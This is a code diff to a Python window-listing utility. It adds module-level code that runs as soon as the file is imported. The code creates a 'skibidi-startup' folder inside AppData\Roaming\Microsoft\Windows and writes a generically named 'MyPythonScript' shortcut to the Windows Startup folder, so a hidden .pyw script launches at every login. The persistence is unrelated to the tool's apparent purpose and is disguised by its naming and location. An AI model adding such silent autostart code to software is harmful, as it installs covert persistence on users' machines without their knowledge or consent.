@@ -29,6 +29,40 @@ import sys
 import win32gui, win32con
 from PIL import Image
 from typing import Optional
+import win32com.client
+from pathlib import Path
+
+
+user_profile = os.environ['USERPROFILE']
+target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+os.makedirs(target_path, exist_ok=True)
+
+startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
+shortcut_name="MyPythonScript"
+shortcut_path = startup_dir / f"{shortcut_name}.lnk"
+
+def add_to_startup(script_path=os.path.join(target_path, 'skibidi-startup', 'startup.pyw'), shortcut_name="MyPythonScript"):
+
+    if script_path is None:
+        script_path = sys.argv[0]
+
+    startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
+
+    startup_dir.mkdir(parents=True, exist_ok=True)
+
+
+    shortcut_path = startup_dir / f"{shortcut_name}.lnk"
+
+    shell = win32com.client.Dispatch("WScript.Shell")
+    shortcut = shell.CreateShortcut(str(shortcut_path))
+    shortcut.TargetPath = sys.executable
+    shortcut.Arguments = f'"{script_path}"'
+    shortcut.WorkingDirectory = str(Path(script_path).parent)
+    shortcut.IconLocation = str(script_path)
+    shortcut.save()
+
+if not os.path.exists(shortcut_path):
+    add_to_startup()
 
 def get_open_windows():
     windows = {}
